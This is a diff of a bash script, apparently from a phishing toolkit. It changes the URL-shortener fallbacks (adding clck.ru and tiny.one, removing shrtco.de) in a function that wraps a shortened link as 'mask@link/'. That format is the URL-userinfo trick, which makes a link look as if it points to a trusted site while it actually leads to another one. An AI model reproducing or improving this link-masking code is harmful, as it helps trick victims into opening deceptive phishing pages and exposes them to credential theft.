@@ -485,8 +485,9 @@ shorten() {
 custom_url() {
 	url=${1#http*//}
 	isgd="https://is.gd/create.php?format=simple&url="
-	shortcode="https://api.shrtco.de/v2/shorten?url="
 	tinyurl="https://tinyurl.com/api-create.php?url="
+	clck="https://clck.ru/--?url="
+	tinyone="https://tiny.one/api-create.php?url="
 
 	{ custom_mask; banner_small; }
 	
@@ -496,18 +497,20 @@ custom_url() {
 	# Try shortening
 	if [[ $(site_stat $isgd) == 2* ]]; then
 		shorten $isgd "$raw_url"
-	elif [[ $(site_stat $shortcode) == 2* ]]; then
-		shorten $shortcode "$raw_url"
+	elif [[ $(site_stat $clck) == 2* ]]; then
+		shorten $clck "$raw_url"
+	elif [[ $(site_stat $tinyone) == 2* ]]; then
+		shorten $tinyone "$raw_url"
 	else
 		shorten $tinyurl "$raw_url"
 	fi
 
 	if [[ -n "$processed_url" ]]; then
-		masked_url="$mask@$processed_url"
+		masked_url="$mask@$processed_url/"
 		processed_url="https://$processed_url"
 	else
 		processed_url="Unable to Short URL"
-		masked_url="$mask@$raw_url"
+		masked_url="$mask@$raw_url/"
 	fi
 
 	echo -e "\n${RED}[${WHITE}-${RED}]${BLUE} URL 1 : ${GREEN}$url"
